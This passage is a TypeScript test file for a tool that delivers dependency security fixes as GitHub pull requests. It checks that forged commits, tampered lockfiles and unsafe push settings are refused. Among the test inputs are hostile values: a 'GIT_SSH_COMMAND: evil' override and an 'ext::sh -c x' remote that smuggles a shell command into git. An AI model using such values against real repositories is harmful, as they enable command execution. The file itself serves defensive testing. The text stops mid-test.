// The scheduled workflow's two jobs (packages/cli/src/security/deliver.ts): the validation job packs the applied fixes,
// and the PR job opens one PR per fix only after the artifact passes every check. Each refusal below is an artifact the
// validation job would not write, and nothing is pushed or opened for it.
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { chmodSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it, vi } from "vitest";
import { fixBranch, fixBranchName, gitBase } from "../src/security/branch.ts";
import { ADVISORY, BUNDLE_LIMIT, checkArtifact, closedWarnings, contentProblem, deliverCli, FILE_LIMIT, fileLimit, openFixes, packFixes, packagistRelease, pullRequestBody, pushInvocation, type CheckedFix } from "../src/security/deliver.ts";
import { changedManifest } from "../src/security/inventory.ts";
import { lockEntries, lockEntryChanges, type Judgement } from "../src/security/judge.ts";
import { registryManifest } from "../src/security/npm-facts.ts";
import { PKSA_ID } from "../src/security/packagist.ts";
import { snapshot } from "../src/security/project.ts";
import { commit, git } from "./git.ts";

const ID = "0f1e2d3c-4b5a-4968-8776-655443322110";
const sha256 = (text: string) => createHash("sha256").update(text).digest("hex");
const PKG = "{\"name\":\"app\",\"dependencies\":{\"lodash\":\"4.17.20\"}}\n";
const PKG_FIXED = "{\n  \"name\": \"app\",\n  \"dependencies\": {\n    \"lodash\": \"4.17.21\"\n  }\n}\n";
const LOCK = "{\n  \"name\": \"app\",\n  \"lockfileVersion\": 3,\n  \"packages\": { \"node_modules/lodash\": { \"version\": \"4.17.20\" } }\n}\n";
const FIXED = LOCK.replace("4.17.20", "4.17.21");
const SUBJECT = "ludion: lodash 4.17.20 -> 4.17.21 (npm)";
const BRANCH = "ludion/npm/lodash-4.17.21";
/** The message dependency-patch.ts writes for the fixture's fix. */
const message = (base: string, subject = SUBJECT, extra = "") => `${subject}\n\nFixes GHSA-35jh-r3h4-6jhm, CVE-2021-23337.\n\nLudion receipt ${ID}: the project's test passed on ${base.slice(0, 12)} and on this change alone, offline in Docker.\nSource dependency files only; production was not changed.\n${extra}`;
const READY = async () => ({ verdict: "ready_except_build", findings: [] }) as unknown as Judgement;
/** The registry's manifest for any version: one that requires nothing, as the fixtures' moved entries declare. */
const NO_REQUIREMENTS = async (name: string, version: string) => ({ name, version });

/** A project (npm policy) with two commits, and an origin it was pushed to. `base` is the second commit. */
function project() {
  const work = mkdtempSync(join(tmpdir(), "ludion-deliver-work-"));
  writeFileSync(join(work, "ludion.security.json"), `${JSON.stringify({ schema: 1, ecosystem: "npm", image: "node:24-slim", test: ["npm", "test"], timeout_seconds: 60 })}\n`);
  writeFileSync(join(work, "package.json"), PKG);
  writeFileSync(join(work, "package-lock.json"), LOCK);
  writeFileSync(join(work, "README.md"), "app\n");
  const first = commit(work);
  writeFileSync(join(work, "README.md"), "app, second\n");
  const base = commit(work);
  git(work, "branch", "-M", "main");
  const origin = mkdtempSync(join(tmpdir(), "ludion-deliver-origin-"));
  git(origin, "init", "-q", "--bare");
  git(work, "push", "-q", origin, "main:refs/heads/main");
  return { work, origin, first, base };
}

/** The fix branch as `patch --apply` makes it (branch.ts), and the receipt that names it. */
function applied(work: string) {
  const copy = mkdtempSync(join(tmpdir(), "ludion-deliver-copy-"));
  snapshot(work, copy);
  const base = gitBase(work, copy);
  const made = fixBranch(base, BRANCH, [{ path: "package.json", content: PKG_FIXED }, { path: "package-lock.json", content: FIXED }], message(base.commit));
  return { commit: made, receipt: receiptFor(base.commit, made) };
}
function receiptFor(base: string, made: string, lock = FIXED, pkg = PKG_FIXED): Record<string, unknown> {
  return {
    schema: 2, id: ID, ecosystem: "npm", scope: "dependency_files_only_not_deployed", outcome: "partial", baseline_passed: true, base_commit: base,
    fixes: [
      {
        package: "lodash", changes: [{ name: "lodash", from: "4.17.20", to: "4.17.21", advisories: ["GHSA-35jh-r3h4-6jhm", "CVE-2021-23337"] }],
        outcome: "applied", branch: BRANCH, commit: made, candidate_passed: true,
        files: [{ path: "package.json", before_hash: sha256(PKG), after_hash: sha256(pkg) }, { path: "package-lock.json", before_hash: sha256(LOCK), after_hash: sha256(lock) }],
        fix_published_at: "2021-02-20T15:42:16.891Z", fix_published_note: "registry", found_at: "2026-10-30T01:00:00.000Z", applied_at: "2026-10-30T01:05:00.000Z",
        judgement: { verdict: "ready_except_build" },
      },
      { package: "minimist", changes: [{ name: "minimist", from: "1.2.5", to: "1.2.6", advisories: ["GHSA-xvch-5gv4-984h"] }], outcome: "failed", branch: null, commit: null, candidate_passed: false, files: [], reason: "The judge's wait is not over" },
    ],
  };
}

/** An artifact as `deliver pack` writes it, from any receipt and any refs of `work` (to forge one). */
function artifact(work: string, receipt: unknown, refs: string[], base: string): string {
  const out = mkdtempSync(join(tmpdir(), "ludion-deliver-artifact-"));
  writeFileSync(join(out, "receipt.json"), `${JSON.stringify(receipt)}\n`);
  if (refs.length) git(work, "bundle", "create", "-q", join(out, "fixes.bundle"), ...refs, `^${base}`);
  return out;
}
/** The PR job's checkout as actions/checkout makes it: depth 1, at the base, HEAD detached, no fix branch. */
function checkout(origin: string): string {
  const dir = mkdtempSync(join(tmpdir(), "ludion-deliver-pr-"));
  git(dir, "clone", "-q", "--depth", "1", `file://${origin}`, ".");
  git(dir, "checkout", "-q", "--detach");
  return dir;
}

/** A commit made by hand in `work`: any parent, files (the fix's two by default), file mode, author and message. */
function forge(work: string, branch: string, parent: string, files: Record<string, string>, options: { mode?: string; author?: string; subject?: string; base?: string; extra?: string; date?: string } = {}): string {
  const index = join(mkdtempSync(join(tmpdir(), "ludion-deliver-index-")), "index");
  const env = { ...process.env, GIT_INDEX_FILE: index, GIT_AUTHOR_NAME: options.author ?? "Ludion", GIT_AUTHOR_EMAIL: "ludion@ludion.invalid", GIT_COMMITTER_NAME: "Ludion", GIT_COMMITTER_EMAIL: "ludion@ludion.invalid", ...(options.date ? { GIT_AUTHOR_DATE: options.date, GIT_COMMITTER_DATE: options.date } : {}) };
  const run = (args: string[], input?: string) => {
    const r = spawnSync("git", args, { cwd: work, env, input, encoding: "utf8" });
    if (r.status !== 0) throw new Error(r.stderr);
    return r.stdout.trim();
  };
  run(["read-tree", parent]);
  for (const [path, content] of Object.entries({ "package.json": PKG_FIXED, ...files })) run(["update-index", "--add", "--cacheinfo", options.mode ?? "100644", run(["hash-object", "-w", "--stdin"], content), path]);
  const made = run(["commit-tree", run(["write-tree"]), "-p", parent, "-F", "-"], message(options.base ?? parent, options.subject, options.extra));
  run(["update-ref", `refs/heads/${branch}`, made]);
  return made;
}

/**
 * A commit written byte for byte (git hash-object --literally), to forge what commit-tree would not write: its tree is
 * that of a correct fix commit on `parent`, and its header lines are `headers` (with T for the tree, U for it in upper case).
 */
function raw(work: string, branch: string, parent: string, headers: string[]): string {
  const tree = git(work, "rev-parse", `${forge(work, "ludion/scratch", parent, { "package-lock.json": FIXED })}^{tree}`);
  const text = `${headers.map(h => h.replace(/^tree T$/, `tree ${tree}`).replace(/^tree U$/, `tree ${tree.toUpperCase()}`)).join("\n")}\n\n${message(parent)}`;
  const r = spawnSync("git", ["hash-object", "-t", "commit", "-w", "--literally", "--stdin"], { cwd: work, input: text, encoding: "utf8" });
  if (r.status !== 0) throw new Error(r.stderr);
  git(work, "update-ref", `refs/heads/${branch}`, r.stdout.trim());
  return r.stdout.trim();
}
const WHO = "Ludion <ludion@ludion.invalid> 1793000000 +0000";

/** A stand-in for GitHub's API: the repository, PRs by head branch, branches and commits read from the origin, new PRs. */
function github(origin: string, pulls: { number: number; state: string; head: { ref: string } }[] = [], options: { refuse?: boolean } = {}) {
  const calls: string[] = [], opened: Record<string, unknown>[] = [];
  const reply = (status: number, body: unknown) => new Response(JSON.stringify(body), { status, headers: { "content-type": "application/json" } });
  const read = (args: string[]) => spawnSync("git", args, { cwd: origin, encoding: "utf8" });
  const fetchFn = (async (url: string | URL | Request, init?: RequestInit) => {
    const u = new URL(String(url)), method = init?.method ?? "GET";
    calls.push(`${method} ${u.pathname}${u.search}`);
    expect(new Headers(init?.headers).get("authorization")).toBe("Bearer t0ken");
    if (u.pathname === "/repos/o/r") return reply(200, { default_branch: "main" });
    if (u.pathname === "/repos/o/r/pulls" && method === "GET") return reply(200, pulls.filter(p => `o:${p.head.ref}` === u.searchParams.get("head")));
    if (u.pathname.startsWith("/repos/o/r/git/ref/heads/")) {
      const branch = decodeURIComponent(u.pathname.slice("/repos/o/r/git/ref/heads/".length)), r = read(["rev-parse", "--verify", "--quiet", `refs/heads/${branch}`]);
      return r.status === 0 ? reply(200, { ref: `refs/heads/${branch}`, object: { sha: r.stdout.trim() } }) : reply(404, { message: "Not Found" });
    }
    if (u.pathname.startsWith("/repos/o/r/git/commits/")) {
      const r = read(["log", "-1", "--format=%T %P", u.pathname.slice("/repos/o/r/git/commits/".length)]);
      if (r.status !== 0) return reply(404, { message: "Not Found" });
      const [tree, ...parents] = r.stdout.trim().split(" ");
      return reply(200, { tree: { sha: tree }, parents: parents.map(sha => ({ sha })) });
    }
    if (u.pathname === "/repos/o/r/pulls" && method === "POST") {
      if (options.refuse) return reply(403, { message: "GitHub Actions is not permitted to create or approve pull requests." });
      const body = JSON.parse(String(init?.body));
      opened.push(body);
      const pr = { number: 100 + pulls.length, state: "open", head: { ref: body.head } };
      pulls.push(pr);
      return reply(201, { number: pr.number, html_url: `https://github.com/o/r/pull/${pr.number}` });
    }
    return reply(404, { message: "Not Found" });
  }) as typeof fetch;
  return { fetchFn, calls, opened, pulls };
}
const open = (dir: string, out: string, base: string, origin: string, gh: ReturnType<typeof github>, ref = "refs/heads/main", extra: Partial<Parameters<typeof openFixes>[0]> = {}) =>
  openFixes({ dir, artifact: out, base, repo: "o/r", ref, api: "https://api.github.invalid", remote: origin, token: "t0ken", fetchFn: gh.fetchFn, judgeNpm: READY, npmManifest: NO_REQUIREMENTS, osv: async () => [], ...extra });
const branchAt = (origin: string, branch: string) => spawnSync("git", ["rev-parse", "--verify", "--quiet", `refs/heads/${branch}`], { cwd: origin, encoding: "utf8" }).stdout.trim();

describe("the validation job packs the applied fixes", { timeout: 30_000 }, () => {
  it("writes the receipt and a bundle of exactly the applied fixes' branches, on the base", () => {
    const { work, base } = project(), fix = applied(work);
    const result = join(mkdtempSync(join(tmpdir(), "ludion-deliver-result-")), "patch.json");
    writeFileSync(result, JSON.stringify({ receipt: fix.receipt, path: "x", scan: {} }));
    const out = join(mkdtempSync(join(tmpdir(), "ludion-deliver-out-")), "fixes");
    expect(packFixes(work, result, out)).toEqual({ fixes: 1 });
    expect(JSON.parse(readFileSync(join(out, "receipt.json"), "utf8"))).toEqual(fix.receipt);
    expect(git(work, "bundle", "list-heads", join(out, "fixes.bundle"))).toBe(`${fix.commit} refs/heads/${BRANCH}`);
    expect(git(work, "bundle", "verify", join(out, "fixes.bundle"))).toContain(base);
  });
  it("packs no bundle when nothing was applied, and refuses a branch the receipt does not match", () => {
    const { work } = project(), fix = applied(work), dir = mkdtempSync(join(tmpdir(), "ludion-deliver-result-"));
    writeFileSync(join(dir, "none.json"), JSON.stringify({ receipt: null, path: null, scan: {} }));
    expect(packFixes(work, join(dir, "none.json"), join(dir, "a"))).toEqual({ fixes: 0 });
    expect(readFileSync(join(dir, "a", "receipt.json"), "utf8")).toBe("null\n");
    const wrong = receiptFor(fix.receipt.base_commit as string, "a".repeat(40));
    writeFileSync(join(dir, "wrong.json"), JSON.stringify({ receipt: wrong }));
    expect(() => packFixes(work, join(dir, "wrong.json"), join(dir, "b"))).toThrow("is not at the receipt's commit");
  });
});

describe("the PR job opens one PR per fix", { timeout: 30_000 }, () => {
  it("pushes the checked commit to its branch and opens one PR; the next run opens none", async () => {
    const { work, origin, base } = project(), fix = applied(work);
    const out = artifact(work, fix.receipt, [`refs/heads/${BRANCH}`], base), dir = checkout(origin), gh = github(origin);
    const first = await open(dir, out, base, origin, gh);
    expect(first.deliveries).toEqual([{ package: "lodash", branch: BRANCH, outcome: "opened", pr: 100, url: "https://github.com/o/r/pull/100" }]);
    expect(first.checked.notApplied).toEqual({ failed: 1 });
    expect(branchAt(origin, BRANCH)).toBe(fix.commit);
    expect(gh.opened).toHaveLength(1);
    expect(gh.opened[0]).toMatchObject({ title: SUBJECT, head: BRANCH, base: "main", maintainer_can_modify: false });
    const body = String(gh.opened[0]!.body);
    for (const part of ["`lodash` (npm)", "`4.17.20` → `4.17.21`", "`GHSA-35jh-r3h4-6jhm`, `CVE-2021-23337`", "`2021-02-20T15:42:16.891Z`", "`2026-10-30T01:00:00.000Z`", "`2026-10-30T01:05:00.000Z`", `\`${ID}\``, "`ready_except_build`", "in both jobs", "not all four gates", "Ludion does not merge this PR"]) expect(body).toContain(part);
    expect(body).not.toMatch(/passed the four gates|minimist/);
    // The next scheduled run validates the same fix again; its PR is open, so nothing is pushed or opened.
    const again = await open(checkout(origin), out, base, origin, gh);
    expect(again.deliveries).toEqual([{ package: "lodash", branch: BRANCH, outcome: "open_pr_exists", pr: 100 }]);
    expect(gh.opened).toHaveLength(1);
    expect(gh.calls.filter(c => c.startsWith("POST"))).toHaveLength(1);
  });
  it("does not open a fix again whose PR was closed, nor move a branch that holds another change", async () => {
    const { work, origin, base } = project(), fix = applied(work);
    const out = artifact(work, fix.receipt, [`refs/heads/${BRANCH}`], base);
    const closed = github(origin, [{ number: 7, state: "closed", head: { ref: BRANCH } }]);
    expect((await open(checkout(origin), out, base, origin, closed)).deliveries).toEqual([{ package: "lodash", branch: BRANCH, outcome: "closed_pr_exists", pr: 7, reason: "A PR from this branch was closed; it is not opened again." }]);
    expect(closed.opened).toHaveLength(0);
    expect(branchAt(origin, BRANCH)).toBe("");
    // The fix is still not on the default branch (this run applied it again), so each run warns, and the run stays green.
    expect(closedWarnings([{ package: "lodash", branch: BRANCH, outcome: "closed_pr_exists", pr: 7 }, { package: "x", branch: "ludion/npm/x-1.0.1", outcome: "open_pr_exists", pr: 8 }])).toEqual([
      `::warning::Ludion: the fix of lodash (branch ${BRANCH}) is still not on the default branch, and its PR #7 was closed, so Ludion does not open it again. Reopen #7 or apply the fix yourself.`,
    ]);
    expect(closedWarnings([{ package: "a%0Ab", branch: "ludion/npm/a-1", outcome: "closed_pr_exists", pr: 1 }])[0]).toContain("a%250Ab");
    // The branch exists on GitHub at another commit (here the base itself): it is left alone, no PR, and the fix fails.
    git(work, "push", "-q", origin, `${base}:refs/heads/${BRANCH}`);
    const gh = github(origin), result = await open(checkout(origin), out, base, origin, gh);
    expect(result.deliveries[0]).toMatchObject({ outcome: "branch_differs", reason: expect.stringContaining("delete it, and the next run pushes this fix") });
    expect(branchAt(origin, BRANCH)).toBe(base);
    expect(gh.opened).toHaveLength(0);
    // On the same base, with another change (a lockfile that is not this fix's): also left alone, no PR.
    const other = forge(work, "ludion/other", base, { "package-lock.json": FIXED.replace("\"app\"", "\"other\"") });
    git(work, "push", "-q", origin, `${other}:refs/heads/ludion/other`);
    git(origin, "update-ref", `refs/heads/${BRANCH}`, other);
    const gh2 = github(origin), sameBase = await open(checkout(origin), out, base, origin, gh2);
    expect(sameBase.deliveries[0]).toMatchObject({ outcome: "branch_differs" });
    expect(branchAt(origin, BRANCH)).toBe(other);
    expect(gh2.opened).toHaveLength(0);
  });
  it("deliver open warns, on stderr as a workflow command, about a closed PR's fix, and the run stays green", async () => {
    const { work, origin, base } = project(), fix = applied(work);
    const out = artifact(work, fix.receipt, [`refs/heads/${BRANCH}`], base), dir = checkout(origin);
    const gh = github(origin, [{ number: 7, state: "closed", head: { ref: BRANCH } }]);
    vi.stubGlobal("fetch", gh.fetchFn);
    const errors = vi.spyOn(console, "error").mockImplementation(() => {}), logs = vi.spyOn(console, "log").mockImplementation(() => {});
    try {
      const code = await deliverCli(["open", "--dir", dir, "--artifact", out, "--base", base, "--repo", "o/r", "--ref", "refs/heads/main", "--api", "https://api.github.invalid", "--remote", origin], { GH_TOKEN: "t0ken" });
      expect(code).toBe(0);
      expect(errors.mock.calls.map(c => c[0])).toEqual([expect.stringMatching(/^::warning::Ludion: the fix of lodash \(branch ludion\/npm\/lodash-4\.17\.21\) is still not on the default branch, and its PR #7 was closed/)]);
      expect(logs.mock.calls.flat().join("\n")).not.toContain("::warning::");
    } finally { vi.unstubAllGlobals(); errors.mockRestore(); logs.mockRestore(); }
  });
  it("after a PR GitHub would not open, the next run opens it from the branch an earlier run pushed", async () => {
    const { work, origin, base } = project(), fix = applied(work);
    const out = artifact(work, fix.receipt, [`refs/heads/${BRANCH}`], base);
    // Run 1: pushed, and GitHub refuses the PR (Actions may not open PRs in this repository).
    const refusing = github(origin, [], { refuse: true });
    const first = await open(checkout(origin), out, base, origin, refusing);
    expect(first.deliveries[0]).toMatchObject({ outcome: "failed", reason: expect.stringContaining("the next run opens the PR from it") });
    expect(branchAt(origin, BRANCH)).toBe(fix.commit);
    // Run 2 validated the same fix again, so its commit differs (another time); the branch on GitHub has the same tree on
    // the same base, so the PR is opened from it, without a push.
    const later = forge(work, BRANCH, base, { "package-lock.json": FIXED }, { date: "2030-01-01T00:00:00Z" });
    expect(later).not.toBe(fix.commit);
    expect(git(work, "rev-parse", `${later}^{tree}`)).toBe(git(work, "rev-parse", `${fix.commit}^{tree}`));
    const out2 = artifact(work, receiptFor(base, later), [`refs/heads/${BRANCH}`], base);
    const pushes: string[] = [], gh = github(origin);
    const result = await open(checkout(origin), out2, base, origin, gh, "refs/heads/main", { push: (_t, _r, c) => { pushes.push(c); } });
    expect(result.deliveries[0]).toMatchObject({ outcome: "opened" });
    expect(pushes).toEqual([]);
    expect(branchAt(origin, BRANCH)).toBe(fix.commit);
  });
  it("opens the PR without pushing when the branch is already at the fix's commit, and a failed push stops only that fix", async () => {
    const { work, origin, base } = project(), fix = applied(work);
    const out = artifact(work, fix.receipt, [`refs/heads/${BRANCH}`], base);
    git(work, "push", "-q", origin, `${fix.commit}:refs/heads/${BRANCH}`);
    const pushes: string[] = [], gh = github(origin);
    const result = await open(checkout(origin), out, base, origin, gh, "refs/heads/main", { push: (_t, _r, c) => { pushes.push(c); } });
    expect(result.deliveries[0]).toMatchObject({ outcome: "opened" });
    expect(pushes).toEqual([]);
    const fresh = project(), second = applied(fresh.work), gh2 = github(fresh.origin);
    const failing = await open(checkout(fresh.origin), artifact(fresh.work, second.receipt, [`refs/heads/${BRANCH}`], fresh.base), fresh.base, fresh.origin, gh2, "refs/heads/main", { push: () => { throw new Error("git push failed: rejected"); } });
    expect(failing.deliveries[0]).toMatchObject({ outcome: "failed", reason: "git push failed: rejected" });
    expect(gh2.opened).toHaveLength(0);
  });
  it("runs the judge again on the lockfile, and pushes nothing when it does not say ready_except_build", async () => {
    const { work, origin, base } = project(), fix = applied(work), gh = github(origin), seen: string[][] = [];
    const out = artifact(work, fix.receipt, [`refs/heads/${BRANCH}`], base);
    const stop = async (before: string, after: string) => {
      seen.push([readFileSync(join(before, "package-lock.json"), "utf8"), readFileSync(join(after, "package-lock.json"), "utf8")]);
      return { verdict: "stop", findings: [{ gate: 2, effect: "stop", message: "lodash@4.17.21 has an install script" }] } as unknown as Judgement;
    };
    const result = await open(checkout(origin), out, base, origin, gh, "refs/heads/main", { judgeNpm: stop });
    expect(seen).toEqual([[LOCK, FIXED]]);
    expect(result.deliveries[0]).toMatchObject({ outcome: "failed", reason: expect.stringContaining("gate 2: lodash@4.17.21 has an install script") });
    expect(branchAt(origin, BRANCH)).toBe("");
    expect(gh.opened).toHaveLength(0);
    const failing = await open(checkout(origin), out, base, origin, gh, "refs/heads/main", { judgeNpm: async () => { throw new Error("registry unreachable"); } });
    expect(failing.deliveries[0]).toMatchObject({ outcome: "failed", reason: expect.stringContaining("could not judge: registry unreachable") });
    expect(branchAt(origin, BRANCH)).toBe("");
  });
  it.skipIf(process.platform === "win32")("keeps a file's executable mode from the base (a checkout from a file system without modes)", async () => {
    const { work, origin } = project();
    chmodSync(join(work, "package-lock.json"), 0o755);
    git(work, "add", "package-lock.json"); git(work, "commit", "-qm", "executable"); git(work, "push", "-q", origin, "HEAD:refs/heads/main");
    const base = git(work, "rev-parse", "HEAD"), fix = applied(work), gh = github(origin);
    expect(git(work, "ls-tree", fix.commit, "package-lock.json")).toMatch(/^100755 /);
    const result = await open(checkout(origin), artifact(work, fix.receipt, [`refs/heads/${BRANCH}`], base), base, origin, gh);
    expect(result.deliveries).toMatchObject([{ outcome: "opened" }]);
  });
  it("opens nothing for a run that is not on the default branch, before reading the artifact", async () => {
    const { work, origin, base } = project(), fix = applied(work), gh = github(origin);
    const out = artifact(work, fix.receipt, [`refs/heads/${BRANCH}`], base);
    await expect(open(checkout(origin), out, base, origin, gh, "refs/heads/feature")).rejects.toThrow("not on the default branch main");
    expect(gh.calls).toEqual(["GET /repos/o/r"]);
    expect(branchAt(origin, BRANCH)).toBe("");
  });
  it("pushes with a plain refspec, the token only in Git's environment, and only to a ludion/ branch", () => {
    const remote = "https://github.com/o/r.git", commit = "a".repeat(40);
    const { args, env } = pushInvocation("/top", remote, commit, BRANCH, "t0ken", "/hooks", { PATH: "/bin", GIT_DIR: "/elsewhere", GIT_SSH_COMMAND: "evil" });
    expect(args.slice(-5)).toEqual(["push", "--no-verify", "--porcelain", remote, `${commit}:refs/heads/${BRANCH}`]);
    expect(args.join(" ")).not.toMatch(/t0ken|--force|\+[0-9a-f]{40}/);
    expect(args).toEqual(expect.arrayContaining(["core.hooksPath=/hooks", "protocol.allow=never", "protocol.https.allow=always", "credential.helper="]));
    expect(env).toMatchObject({ GIT_ALLOW_PROTOCOL: "https", GIT_CONFIG_COUNT: "1", GIT_CONFIG_KEY_0: `http.${remote}.extraheader`, GIT_CONFIG_VALUE_0: `AUTHORIZATION: basic ${Buffer.from("x-access-token:t0ken").toString("base64")}`, PATH: "/bin" });
    expect(env.GIT_DIR).toBeUndefined();
    expect(env.GIT_SSH_COMMAND).toBeUndefined();
    expect(() => pushInvocation("/top", remote, commit, "main", "t0ken", "/hooks")).toThrow("Only a fix commit goes to a ludion/ branch");
    expect(() => pushInvocation("/top", "http://github.com/o/r.git", commit, BRANCH, "t0ken", "/hooks")).toThrow("https URL or an absolute path");
    expect(() => pushInvocation("/top", "ext::sh -c x", commit, BRANCH, "t0ken", "/hooks")).toThrow("https URL or an absolute path");
  });
});

describe("the PR job refuses an artifact the validation job would not write", { timeout: 30_000 }, () => {
  /** Runs the PR job on a forged artifact: it must throw `why`, push nothing and open nothing. */
  async function refused(setup: (p: ReturnType<typeof project>) => { receipt: unknown; refs: string[]; base?: string; tamper?: (out: string) => void }, why: string | RegExp) {
    const p = project(), s = setup(p), out = artifact(p.work, s.receipt, s.refs, s.base ?? p.base);
    s.tamper?.(out);
    const gh = github(p.origin);
    await expect(open(checkout(p.origin), out, s.base ?? p.base, p.origin, gh)).rejects.toThrow(why);
    expect(gh.calls).toEqual(["GET /repos/o/r"]);
    expect(git(p.origin, "for-each-ref", "--format=%(refname)")).toBe("refs/heads/main");
  }
  it("a commit whose parent is not the base", () => refused(p => {
    const made = forge(p.work, BRANCH, p.first, { "package-lock.json": FIXED }, { base: p.base });
    return { receipt: receiptFor(p.base, made), refs: [`refs/heads/${BRANCH}`] };
  }, /does not have the base [0-9a-f]{12} as its only parent|needs commits other than the base/));
  it("two commits on the base, not one", () => refused(p => {
    const middle = forge(p.work, "ludion/x", p.base, { "package-lock.json": LOCK.replace("app", "app2") });
    const made = forge(p.work, BRANCH, middle, { "package-lock.json": FIXED }, { base: p.base });
    return { receipt: receiptFor(p.base, made), refs: [`refs/heads/${BRANCH}`] };
  }, "does not have the base"));
  it("a parent header after author, which Git does not read as a parent (review 6516135819, N1)", () => refused(p => {
    const made = raw(p.work, BRANCH, p.base, ["tree T", `author ${WHO}`, `parent ${p.base}`, `committer ${WHO}`]);
    expect(git(p.work, "rev-list", "--parents", "-n", "1", made)).toBe(made);
    return { receipt: receiptFor(p.base, made), refs: [`refs/heads/${BRANCH}`] };
  }, /does not have the base [0-9a-f]{12} as its only parent|needs commits other than the base/));
  it("a merge commit whose first parent is the base and whose second is another commit in the bundle (review 6529858505, N2)", () => refused(p => {
    const other = forge(p.work, "ludion/other-parent", p.base, { "package-lock.json": LOCK.replace("app", "app2") });
    const made = raw(p.work, BRANCH, p.base, ["tree T", `parent ${p.base}`, `parent ${other}`, `author ${WHO}`, `committer ${WHO}`]);
    expect(git(p.work, "rev-list", "--parents", "-n", "1", made)).toBe(`${made} ${p.base} ${other}`);
    return { receipt: receiptFor(p.base, made), refs: [`refs/heads/${BRANCH}`] };
  }, /does not have the base [0-9a-f]{12} as its only parent/));
  it("headers out of Git's order or beyond it, even with the base as Git's parent", async () => {
    for (const headers of [
      (base: string) => ["tree T", `parent ${base}`, `author ${WHO}`, `parent ${base}`, `committer ${WHO}`],
      (base: string) => ["tree T", `parent ${base}`, `author ${WHO}`, `committer ${WHO}`, "encoding UTF-8"],
      (base: string) => ["tree T", `parent ${base}`, `committer ${WHO}`, `author ${WHO}`],
      // The tree in upper-case hex, which Git reads as the same tree: the tree compared is Git's reading, not the raw
      // text (review 6518582507, N-b R4).
      (base: string) => ["tree U", `parent ${base}`, `author ${WHO}`, `committer ${WHO}`],
    ]) {
      await refused(p => {
        const made = raw(p.work, BRANCH, p.base, headers(p.base));
        expect(git(p.work, "rev-list", "--parents", "-n", "1", made)).toBe(`${made} ${p.base}`);
        return { receipt: receiptFor(p.base, made), refs: [`refs/heads/${BRANCH}`] };
      }, "headers are not exactly tree, parent, author and committer, in that order");
    }
  });
  it("a commit git fsck finds an error in (a zero-padded date), with every other check passing", () => refused(p => {
    const padded = WHO.replace(" 1793000000 ", " 01793000000 ");
    const made = raw(p.work, BRANCH, p.base, ["tree T", `parent ${p.base}`, `author ${padded}`, `committer ${padded}`]);
    return { receipt: receiptFor(p.base, made), refs: [`refs/heads/${BRANCH}`] };
  }, /does not pass git fsck \(.*zeroPaddedDate/));
  it("a lockfile padded past its limit (review 6516135819, N4)", () => refused(p => {
    const padded = FIXED + " ".repeat(fileLimit(LOCK.length) - FIXED.length + 1);
    const made = forge(p.work, BRANCH, p.base, { "package-lock.json": padded });
    return { receipt: receiptFor(p.base, made, padded), refs: [`refs/heads/${BRANCH}`] };
  }, `'s package-lock.json is larger than ${fileLimit(LOCK.length)} bytes`));
  it("a lockfile that does not move the receipt's package and adds another one (review 6516135819, N2)", () => refused(p => {
    const lock = LOCK.replace(`"node_modules/lodash": { "version": "4.17.20" }`, `"node_modules/lodash": { "version": "4.17.20" }, "node_modules/lodash/node_modules/evil-copy": { "version": "9.9.9" }`);
    const made = forge(p.work, BRANCH, p.base, { "package-lock.json": lock });
    return { receipt: receiptFor(p.base, made, lock), refs: [`refs/heads/${BRANCH}`] };
  }, "package-lock.json does not have lodash at 4.17.21, the fix's version"));
  /**
   * A transitive npm fix, minimist 1.2.5 -> 1.2.6, as review 6518582507 forged them: a base where mkdirp requires
   * minimist, and a fix commit whose package-lock.json has `packages` (package.json does not change).
   */
  const MKDIRP = { "": { name: "app", dependencies: { lodash: "4.17.20", mkdirp: "0.5.5" } }, "node_modules/lodash": { version: "4.17.20" }, "node_modules/minimist": { version: "1.2.5" }, "node_modules/mkdirp": { version: "0.5.5", dependencies: { minimist: "^1.2.5" } } };
  function minimistFix(p: ReturnType<typeof project>, packages: Record<string, unknown>) {
    const text = (packages: Record<string, unknown>) => `${JSON.stringify({ name: "app", lockfileVersion: 3, packages }, null, 2)}\n`;
    const pkg = `${JSON.stringify({ name: "app", dependencies: { lodash: "4.17.20", mkdirp: "0.5.5" } })}\n`, before = text(MKDIRP), lock = text(packages);
    writeFileSync(join(p.work, "package.json"), pkg); writeFileSync(join(p.work, "package-lock.json"), before);
    git(p.work, "add", "-A"); git(p.work, "commit", "-qm", "mkdirp"); git(p.work, "push", "-q", p.origin, "HEAD:refs/heads/main");
    const base = git(p.work, "rev-parse", "HEAD"), branch = fixBranchName("", "npm", "minimist", ["1.2.6"]);
    const made = forge(p.work, branch, base, { "package.json": pkg, "package-lock.json": lock }, { subject: "ludion: minimist 1.2.5 -> 1.2.6 (npm)" });
    const receipt = receiptFor(base, made) as { fixes: Record<string, unknown>[] };
    Object.assign(receipt.fixes[0]!, { package: "minimist", branch, changes: [{ name: "minimist", from: "1.2.5", to: "1.2.6", advisories: ["GHSA-35jh-r3h4-6jhm", "CVE-2021-23337"] }], files: [{ path: "package-lock.json", before_hash: sha256(before), after_hash: sha256(lock) }] });
    receipt.fixes.pop();
    return { receipt, refs: [`refs/heads/${branch}`], base, branch };
  }
  /**
   * Review 6538813186's B1, as npm 12.2.1 wrote it (fixtures/npm-corpus/extra/node-fetch, docs/decisions/2026-10-31-lock-flags-only.md):
   * node-fetch 2.6.1 -> 2.6.7, whose new requirement on the project's dev-only whatwg-url makes npm drop `dev` from
   * whatwg-url, tr46 and webidl-conversions, with their versions, resolved and integrity unchanged.
   */
  const nodeFetch = (v: string, side: "base" | "fix") => readFileSync(new URL(`fixtures/npm-corpus/extra/node-fetch/${v}/${side}/package-lock.json`, import.meta.url), "utf8");
  it("an npm fix that npm 12.2.1 writes with other entries' flags changed is opened (review 6538813186, B1)", async () => {
    for (const v of ["v2", "v3"]) {
      const p = project(), before = nodeFetch(v, "base"), lock = nodeFetch(v, "fix");
      const pkg = readFileSync(new URL(`fixtures/npm-corpus/extra/node-fetch/${v}/base/package.json`, import.meta.url), "utf8");
      writeFileSync(join(p.work, "package.json"), pkg); writeFileSync(join(p.work, "package-lock.json"), before);
      git(p.work, "add", "-A"); git(p.work, "commit", "-qm", "node-fetch"); git(p.work, "push", "-q", p.origin, "HEAD:refs/heads/main");
      const change = { name: "node-fetch", from: "2.6.1", to: "2.6.7", advisories: ["GHSA-35jh-r3h4-6jhm", "CVE-2021-23337"] };
